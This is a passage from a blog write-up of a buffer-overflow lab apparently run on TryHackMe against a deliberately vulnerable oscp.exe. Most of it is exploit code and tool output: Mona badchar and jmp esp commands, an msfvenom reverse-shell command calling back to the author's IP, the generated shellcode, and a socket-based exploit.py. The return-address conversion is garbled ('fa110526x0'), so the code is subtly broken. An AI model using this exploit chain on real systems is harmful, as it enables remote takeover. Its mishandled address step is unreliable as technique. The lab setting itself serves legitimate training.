style="color:#ae81ff">\x</span>76<span style="color:#ae81ff">\x</span>77<span style="color:#ae81ff">\x</span>78<span style="color:#ae81ff">\x</span>79<span style="color:#ae81ff">\x</span>7a<span style="color:#ae81ff">\x</span>7b<span style="color:#ae81ff">\x</span>7c<span style="color:#ae81ff">\x</span>7d<span style="color:#ae81ff">\x</span>7e<span style="color:#ae81ff">\x</span>7f<span style="color:#ae81ff">\x</span>80<span style="color:#ae81ff">\x</span>81<span style="color:#ae81ff">\x</span>82<span style="color:#ae81ff">\x</span>83<span style="color:#ae81ff">\x</span>84<span style="color:#ae81ff">\x</span>85<span style="color:#ae81ff">\x</span>86<span style="color:#ae81ff">\x</span>87<span style="color:#ae81ff">\x</span>88<span style="color:#ae81ff">\x</span>89<span style="color:#ae81ff">\x</span>8a<span style="color:#ae81ff">\x</span>8b<span style="color:#ae81ff">\x</span>8c<span style="color:#ae81ff">\x</span>8d<span style="color:#ae81ff">\x</span>8e<span style="color:#ae81ff">\x</span>8f<span style="color:#ae81ff">\x</span>90<span style="color:#ae81ff">\x</span>91<span style="color:#ae81ff">\x</span>92<span style="color:#ae81ff">\x</span>93<span style="color:#ae81ff">\x</span>94<span style="color:#ae81ff">\x</span>95<span style="color:#ae81ff">\x</span>96<span style="color:#ae81ff">\x</span>97<span style="color:#ae81ff">\x</span>98<span style="color:#ae81ff">\x</span>99<span style="color:#ae81ff">\x</span>9a<span style="color:#ae81ff">\x</span>9b<span style="color:#ae81ff">\x</span>9c<span style="color:#ae81ff">\x</span>9d<span style="color:#ae81ff">\x</span>9e<span style="color:#ae81ff">\x</span>9f<span style="color:#ae81ff">\x</span>a0<span style="color:#ae81ff">\x</span>a1<span style="color:#ae81ff">\x</span>a2<span style="color:#ae81ff">\x</span>a3<span style="color:#ae81ff">\x</span>a4<span style="color:#ae81ff">\x</span>a5<span style="color:#ae81ff">\x</span>a6<span style="color:#ae81ff">\x</span>a7<span style="color:#ae81ff">\x</span>a8<span style="color:#ae81ff">\x</span>a9<span style="color:#ae81ff">\x</span>aa<span style="color:#ae81ff">\x</span>ab<span style="color:#ae81ff">\x</span>ac<span style="color:#ae81ff">\x</span>ad<span style="color:#ae81ff">\x</span>ae<span style="color:#ae81ff">\x</span>af<span style="color:#ae81ff">\x</span>b0<span style="color:#ae81ff">\x</span>b1<span style="color:#ae81ff">\x</span>b2<span style="color:#ae81ff">\x</span>b3<span style="color:#ae81ff">\x</span>b4<span style="color:#ae81ff">\x</span>b5<span style="color:#ae81ff">\x</span>b6<span style="color:#ae81ff">\x</span>b7<span style="color:#ae81ff">\x</span>b8<span style="color:#ae81ff">\x</span>b9<span style="color:#ae81ff">\x</span>ba<span style="color:#ae81ff">\x</span>bb<span style="color:#ae81ff">\x</span>bc<span style="color:#ae81ff">\x</span>bd<span style="color:#ae81ff">\x</span>be<span style="color:#ae81ff">\x</span>bf<span style="color:#ae81ff">\x</span>c0<span style="color:#ae81ff">\x</span>c1<span style="color:#ae81ff">\x</span>c2<span style="color:#ae81ff">\x</span>c3<span style="color:#ae81ff">\x</span>c4<span style="color:#ae81ff">\x</span>c5<span style="color:#ae81ff">\x</span>c6<span style="color:#ae81ff">\x</span>c7<span style="color:#ae81ff">\x</span>c8<span style="color:#ae81ff">\x</span>c9<span style="color:#ae81ff">\x</span>ca<span style="color:#ae81ff">\x</span>cb<span style="color:#ae81ff">\x</span>cc<span style="color:#ae81ff">\x</span>cd<span style="color:#ae81ff">\x</span>ce<span style="color:#ae81ff">\x</span>cf<span style="color:#ae81ff">\x</span>d0<span style="color:#ae81ff">\x</span>d1<span style="color:#ae81ff">\x</span>d2<span style="color:#ae81ff">\x</span>d3<span style="color:#ae81ff">\x</span>d4<span style="color:#ae81ff">\x</span>d5<span style="color:#ae81ff">\x</span>d6<span style="color:#ae81ff">\x</span>d7<span style="color:#ae81ff">\x</span>d8<span style="color:#ae81ff">\x</span>d9<span style="color:#ae81ff">\x</span>da<span style="color:#ae81ff">\x</span>db<span style="color:#ae81ff">\x</span>dc<span style="color:#ae81ff">\x</span>dd<span style="color:#ae81ff">\x</span>de<span style="color:#ae81ff">\x</span>df<span style="color:#ae81ff">\x</span>e0<span style="color:#ae81ff">\x</span>e1<span style="color:#ae81ff">\x</span>e2<span style="color:#ae81ff">\x</span>e3<span style="color:#ae81ff">\x</span>e4<span style="color:#ae81ff">\x</span>e5<span style="color:#ae81ff">\x</span>e6<span style="color:#ae81ff">\x</span>e7<span style="color:#ae81ff">\x</span>e8<span style="color:#ae81ff">\x</span>e9<span style="color:#ae81ff">\x</span>ea<span style="color:#ae81ff">\x</span>eb<span style="color:#ae81ff">\x</span>ec<span style="color:#ae81ff">\x</span>ed<span style="color:#ae81ff">\x</span>ee<span style="color:#ae81ff">\x</span>ef<span style="color:#ae81ff">\x</span>f0<span style="color:#ae81ff">\x</span>f1<span style="color:#ae81ff">\x</span>f2<span style="color:#ae81ff">\x</span>f3<span style="color:#ae81ff">\x</span>f4<span style="color:#ae81ff">\x</span>f5<span style="color:#ae81ff">\x</span>f6<span style="color:#ae81ff">\x</span>f7<span style="color:#ae81ff">\x</span>f8<span style="color:#ae81ff">\x</span>f9<span style="color:#ae81ff">\x</span>fa<span style="color:#ae81ff">\x</span>fb<span style="color:#ae81ff">\x</span>fc<span style="color:#ae81ff">\x</span>fd<span style="color:#ae81ff">\x</span>fe<span style="color:#ae81ff">\x</span>ff
</code></pre></div><p>Update your exploit.py script and set the payload variable to the string of bad chars the script generates.</p>
<blockquote>
<p>We restart the debugger and load the oscp.exe file, and unpause again.</p>
</blockquote>
<p>then we run <code>python exploit.py</code> again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ python exploit.py      
Sending evil buffer...
Done!
</code></pre></div><p>We take note of the address the ESP is pointing to:</p>

    <img src="../img/e1784dc21fda659927e77319c9a2ed9d.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>Then we use the address for the following Mona command:</p>
<p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a 0191FA30</code></p>
<p>When we run that Mona command we get the following:</p>
<blockquote>
<p>A popup window should appear labelled &ldquo;mona Memory comparison results&rdquo;. If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file. Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.</p>
</blockquote>

    <img src="../img/ab7af4e083517511e66fb6f481ed1a48.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>We take note of the badchars returned:</p>
<p><code>00 07 08 2e 2f a0 a1</code></p>
<p>The first badchar in the list should be the null byte (\x00) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with \x00. Then update the payload variable in your exploit.py script and remove the new badchars as well.</p>
<p>Our new Mona byarray command will look like this:</p>
<p><code>!mona bytearray -b &quot;\x00\x07\x08\xa0\xa1\x2e\x2f&quot;</code></p>

    <img src="../img/95817dc93216776f4e1cf188d730de85.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>We update the exploit script and remove all badchars we have indentified. Then guess what?</p>
<blockquote>
<p>We restart the debugger and load the oscp.exe file, and unpause again.</p>
</blockquote>
<p>We repeat the badchar comparison until the results status returns &ldquo;Unmodified&rdquo;. This indicates that no more badchars exist. This means executing the expliot, running the Mona-look-for-bad-chars-command, if there are new badchars we run mona-generate-new-bytearray-excluding-new-badchards-command, update the exploit. Relaunch everything (Immunity and OSCP.exe).</p>
<p>So let&rsquo;s check for badchars one more time, we take note of the ESP address:</p>

    <img src="../img/036004b480c8e45275b98424ce84788e.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p><code>!mona compare -f C:\mona\oscp\bytearray.bin -a 019FFA30</code></p>
<p>It seems we don&rsquo;t have any other badchars for now:</p>

    <img src="../img/6e0e86056a6014acef32c02cdb1f9149.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<h3 id="finding-a-jump-point">Finding a Jump Point</h3>
<p>With the oscp.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):</p>
<p><code>!mona jmp -r esp -cpb &quot;\x00&quot;</code></p>
<p>Let&rsquo;s update that command with all the badchars:</p>
<p><code>!mona jmp -r esp -cpb &quot;\x00\x07\x08\xa0\xa1\x2e\x2f&quot;</code></p>
<p>This command finds all &ldquo;jmp esp&rdquo; (or equivalent) instructions with addresses that don&rsquo;t contain any of the badchars specified. The results should display in the &ldquo;Log data&rdquo; window (use the Window menu to switch to it if needed).</p>

    <img src="../img/71fd63f844acd872337965c63873c87b.png"  alt="Immunity Debugger Console"  class="center"  style="border-radius: 8px;"  />

<p>Choose an address and update your exploit.py script, setting the &ldquo;retn&rdquo; variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.</p>
<p>Ok, we pick up the first address from the list of results. This one:</p>
<p><code>0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)</code></p>
<p>The address is <code>0x625011af</code> and we reverse that since the system is little indian we get this <code>fa110526x0</code>. When we need to add this address to our exploit in the return address field.</p>
<p>Our python exploit now looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket

ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.84.54&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>

prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW1 &#34;</span>
offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">1978</span>
overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fa110526x0&#34;</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color:#e6db74">&#34;</span>
postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix

s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)

<span style="color:#66d9ef">try</span>:
    s<span style="color:#f92672">.</span>connect((ip, port))
    print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
    s<span style="color:#f92672">.</span>send(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
    print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
<span style="color:#66d9ef">except</span>:
    print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
</code></pre></div><h3 id="generate-payload">Generate Payload</h3>
<p>Run the following msfvenom command on Kali, using your Kali VPN IP as the LHOST and updating the -b option with all the badchars you identified (including \x00):</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.13.0.34 LPORT=4444 EXITFUNC=thread -b &quot;\x00\x07\x08\xa0\xa1\x2e\x2f&quot; -f py</code></p>
<p>when we run that command we get this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/bufferOverflowPrep<span style="color:#f92672">]</span>
└─$ msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.13.0.34 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00\x07\x08\xa0\xa1\x2e\x2f&#34;</span> -f py
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
<span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x86 from the payload
Found <span style="color:#ae81ff">11</span> compatible encoders
Attempting to encode payload with <span style="color:#ae81ff">1</span> iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size <span style="color:#ae81ff">351</span> <span style="color:#f92672">(</span>iteration<span style="color:#f92672">=</span>0<span style="color:#f92672">)</span>
x86/shikata_ga_nai chosen with final size <span style="color:#ae81ff">351</span>
Payload size: <span style="color:#ae81ff">351</span> bytes
Final size of py file: <span style="color:#ae81ff">1712</span> bytes
buf <span style="color:#f92672">=</span>  b<span style="color:#e6db74">&#34;&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xdb\xc0\xd9\x74\x24\xf4\xb8\xe9\xa2\xf5\xe7\x5e\x31&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xc9\xb1\x52\x83\xc6\x04\x31\x46\x13\x03\xaf\xb1\x17&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x12\xd3\x5e\x55\xdd\x2b\x9f\x3a\x57\xce\xae\x7a\x03&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x9b\x81\x4a\x47\xc9\x2d\x20\x05\xf9\xa6\x44\x82\x0e&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x0e\xe2\xf4\x21\x8f\x5f\xc4\x20\x13\xa2\x19\x82\x2a&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x6d\x6c\xc3\x6b\x90\x9d\x91\x24\xde\x30\x05\x40\xaa&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x88\xae\x1a\x3a\x89\x53\xea\x3d\xb8\xc2\x60\x64\x1a&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xe5\xa5\x1c\x13\xfd\xaa\x19\xed\x76\x18\xd5\xec\x5e&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x50\x16\x42\x9f\x5c\xe5\x9a\xd8\x5b\x16\xe9\x10\x98&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xab\xea\xe7\xe2\x77\x7e\xf3\x45\xf3\xd8\xdf\x74\xd0&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xbf\x94\x7b\x9d\xb4\xf2\x9f\x20\x18\x89\xa4\xa9\x9f&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x5d\x2d\xe9\xbb\x79\x75\xa9\xa2\xd8\xd3\x1c\xda\x3a&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xbc\xc1\x7e\x31\x51\x15\xf3\x18\x3e\xda\x3e\xa2\xbe&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x74\x48\xd1\x8c\xdb\xe2\x7d\xbd\x94\x2c\x7a\xc2\x8e&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x89\x14\x3d\x31\xea\x3d\xfa\x65\xba\x55\x2b\x06\x51&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xa5\xd4\xd3\xf6\xf5\x7a\x8c\xb6\xa5\x3a\x7c\x5f\xaf&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xb4\xa3\x7f\xd0\x1e\xcc\xea\x2b\xc9\xf9\xe7\x33\x2b&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x96\xf5\x33\x3a\x3a\x73\xd5\x56\xd2\xd5\x4e\xcf\x4b&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x7c\x04\x6e\x93\xaa\x61\xb0\x1f\x59\x96\x7f\xe8\x14&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x84\xe8\x18\x63\xf6\xbf\x27\x59\x9e\x5c\xb5\x06\x5e&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x2a\xa6\x90\x09\x7b\x18\xe9\xdf\x91\x03\x43\xfd\x6b&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xd5\xac\x45\xb0\x26\x32\x44\x35\x12\x10\x56\x83\x9b&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x1c\x02\x5b\xca\xca\xfc\x1d\xa4\xbc\x56\xf4\x1b\x17&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x3e\x81\x57\xa8\x38\x8e\xbd\x5e\xa4\x3f\x68\x27\xdb&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\xf0\xfc\xaf\xa4\xec\x9c\x50\x7f\xb5\xbd\xb2\x55\xc0&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x55\x6b\x3c\x69\x38\x8c\xeb\xae\x45\x0f\x19\x4f\xb2&#34;</span>
buf <span style="color:#f92672">+=</span> b<span style="color:#e6db74">&#34;\x0f\x68\x4a\xfe\x97\x81\x26\x6f\x72\xa5\x95\x90\x57&#34;</span>
</code></pre></div><blockquote>
<p>Copy the generated python code and integrate it into your exploit.py script, e.g. by setting the payload variable equal to the buf variable from the code.</p>
</blockquote>
<p>After we do that the script looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket

ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.84.54&#34;</span>
port <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
prefix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;OVERFLOW1 &#34;</span>
offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">1978</span>
overflow <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
retn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;fa110526&#34;</span>
padding <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdb\xc0\xd9\x74\x24\xf4\xb8\xe9\xa2\xf5\xe7\x5e\x31</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc9\xb1\x52\x83\xc6\x04\x31\x46\x13\x03\xaf\xb1\x17</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x12\xd3\x5e\x55\xdd\x2b\x9f\x3a\x57\xce\xae\x7a\x03</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9b\x81\x4a\x47\xc9\x2d\x20\x05\xf9\xa6\x44\x82\x0e</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0e\xe2\xf4\x21\x8f\x5f\xc4\x20\x13\xa2\x19\x82\x2a</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6d\x6c\xc3\x6b\x90\x9d\x91\x24\xde\x30\x05\x40\xaa</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x88\xae\x1a\x3a\x89\x53\xea\x3d\xb8\xc2\x60\x64\x1a</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe5\xa5\x1c\x13\xfd\xaa\x19\xed\x76\x18\xd5\xec\x5e</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x50\x16\x42\x9f\x5c\xe5\x9a\xd8\x5b\x16\xe9\x10\x98</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xab\xea\xe7\xe2\x77\x7e\xf3\x45\xf3\xd8\xdf\x74\xd0</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbf\x94\x7b\x9d\xb4\xf2\x9f\x20\x18\x89\xa4\xa9\x9f</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5d\x2d\xe9\xbb\x79\x75\xa9\xa2\xd8\xd3\x1c\xda\x3a</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xbc\xc1\x7e\x31\x51\x15\xf3\x18\x3e\xda\x3e\xa2\xbe</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x74\x48\xd1\x8c\xdb\xe2\x7d\xbd\x94\x2c\x7a\xc2\x8e</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x89\x14\x3d\x31\xea\x3d\xfa\x65\xba\x55\x2b\x06\x51</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa5\xd4\xd3\xf6\xf5\x7a\x8c\xb6\xa5\x3a\x7c\x5f\xaf</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb4\xa3\x7f\xd0\x1e\xcc\xea\x2b\xc9\xf9\xe7\x33\x2b</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x96\xf5\x33\x3a\x3a\x73\xd5\x56\xd2\xd5\x4e\xcf\x4b</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7c\x04\x6e\x93\xaa\x61\xb0\x1f\x59\x96\x7f\xe8\x14</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x84\xe8\x18\x63\xf6\xbf\x27\x59\x9e\x5c\xb5\x06\x5e</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2a\xa6\x90\x09\x7b\x18\xe9\xdf\x91\x03\x43\xfd\x6b</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd5\xac\x45\xb0\x26\x32\x44\x35\x12\x10\x56\x83\x9b</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1c\x02\x5b\xca\xca\xfc\x1d\xa4\xbc\x56\xf4\x1b\x17</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3e\x81\x57\xa8\x38\x8e\xbd\x5e\xa4\x3f\x68\x27\xdb</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf0\xfc\xaf\xa4\xec\x9c\x50\x7f\xb5\xbd\xb2\x55\xc0</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x55\x6b\x3c\x69\x38\x8c\xeb\xae\x45\x0f\x19\x4f\xb2</span><span style="color:#e6db74">&#34;</span>
buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x68\x4a\xfe\x97\x81\x26\x6f\x72\xa5\x95\x90\x57</span><span style="color:#e6db74">&#34;</span>
payload <span style="color:#f92672">=</span> buf
postfix <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

buffer <span style="color:#f92672">=</span> prefix <span style="color:#f92672">+</span> overflow <span style="color:#f92672">+</span> retn <span style="color:#f92672">+</span> padding <span style="color:#f92672">+</span> payload <span style="color:#f92672">+</span> postfix

s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM)

<span style="color:#66d9ef">try</span>:
    s<span style="color:#f92672">.</span>connect((ip, port))
    print(<span style="color:#e6db74">&#34;Sending evil buffer...&#34;</span>)
    s<span style="color:#f92672">.</span>send(buffer <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>)
    print(<span style="color:#e6db74">&#34;Done!&#34;</span>)
<span style="color:#66d9ef">except</span>:
    print(<span style="color:#e6db74">&#34;Could not connect.&#34;</span>)
</code></pre></div><h3 id="prepend-nops">Prepend NOPs</h3>
<p>Since an encoder was likely used to generate the payload, you will need some space in memory for the payload to unpack itself. You can do this by setting the padding variable to a string of 16 or more &ldquo;No Operation&rdquo; (\x90) bytes:</p>
<p><code>padding = &quot;\x90&quot; * 16</code></p>
<h3 id="exploit">Exploit!</h3>
<blockquote>
